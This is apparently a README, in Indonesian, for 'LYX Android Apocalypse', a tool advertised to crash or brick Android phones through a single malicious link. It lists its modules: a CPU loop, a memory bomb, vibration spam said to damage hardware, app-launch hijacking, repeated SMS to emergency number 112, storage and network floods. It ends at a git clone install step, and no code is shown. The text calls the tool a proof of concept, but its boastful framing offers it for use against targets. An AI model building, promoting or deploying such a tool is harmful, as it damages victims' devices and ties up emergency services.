# ☠️ LYX ANDROID APOCALYPSE ☠️

> **“Satu klik, hp mati total. Tidak ada ampun.”**  
> — *Dewa Zamzzz*

---

## 🔥 DESKRIPSI

**LYX ANDROID APOCALYPSE** adalah *proof-of-concept* untuk menguji ketahanan perangkat Android terhadap serangan multi-vektor berbasis browser.  
Dengan hanya mengirimkan satu link, target akan mengalami:

- 💀 CPU overload 100%+ (WebAssembly loop tak berujung)
- 💀 Memory bomb (storage dan RAM habis)
- 💀 Getaran & notifikasi spam tak terkendali
- 💀 Intent spam membuka puluhan aplikasi sekaligus
- 💀 Download otomatis (storage penuh dalam hitungan detik)
- 💀 Alert & popup tidak bisa ditutup
- 💀 Audio noise (speaker berisik)
- 💀 Wake lock (layar tidak bisa mati)
- 💀 Reload otomatis jika halaman ditutup
- 💀 Bluetooth & USB crash (driver error)
- 💀 Dan masih banyak lagi…

**Hasil akhir:** HP mati total, bootloop, atau *brick* dalam waktu kurang dari 60 detik.

---

## 📦 FITUR

| Modul | Deskripsi |
|-------|-----------|
| **WebAssembly Loop** | Infinite loop di level CPU, membuat prosesor 100% |
| **Memory Bomb** | Alokasi array raksasa hingga RAM tersedot habis |
| **Vibration Spam** | Getar tanpa henti (bisa merusak motor getar fisik) |
| **Notification Flood** | Notifikasi spam dengan ikon tengkorak |
| **Intent Hijack** | Membuka aplikasi secara acak (Settings, Contacts, WhatsApp, dll) |
| **SMS Spam** | Mengirim SMS ke nomor darurat (112) berulang kali |
| **Storage Overload** | Menulis data besar ke IndexedDB & download file sampah |
| **GPU Exhaust** | Canvas 4K dengan render acak (memakan GPU) |
| **Audio Noise** | Menghasilkan suara random dari speaker |
| **Geolocation Spam** | Meminta lokasi terus-menerus (boros baterai) |
| **Bluetooth/USB Flood** | Meminta perangkat Bluetooth/USB secara terus-menerus |
| **Wake Lock** | Mencegah layar mati (baterai cepat habis) |
| **Clipboard Spam** | Mengganti isi clipboard setiap 200ms |
| **Iframe Bomb** | Memuat 100 iframe tersembunyi (traffic + memory) |
| **WebSocket Flood** | Membuka 50 koneksi WebSocket setiap 100ms |
| **WebRTC Leak** | Membuat offer SDP terus-menerus (bandwidth habis) |

---

## 🚀 CARA INSTALASI & PENGGUNAAN

### 1. Clone repositori
```bash
git clone https://github.com/lyx-redteam/android-apocalypse.git
cd android-apocalypse
